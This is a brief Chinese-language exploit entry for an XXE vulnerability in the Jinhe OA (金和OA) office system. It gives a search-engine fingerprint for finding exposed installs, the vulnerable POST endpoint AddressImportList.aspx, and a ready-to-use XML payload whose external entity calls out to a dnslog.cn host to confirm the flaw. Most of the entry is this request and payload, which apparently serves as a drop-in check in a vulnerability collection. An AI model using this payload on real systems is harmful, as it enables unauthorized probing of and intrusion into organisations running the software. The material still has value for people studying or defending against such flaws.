# 金和OA_C6AddressImportList存在XXE漏洞

金和OA ｜ XXE ｜ —
- **指纹**：`app="金和网络-金和 OA"`
- **请求**：`POST /c6/Jhsoft.Web.addressbook/AddressImportList.aspx/ HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://dnslog.cn/xxe_test">
%remote;]>
<root/>
```
- **响应特征**：200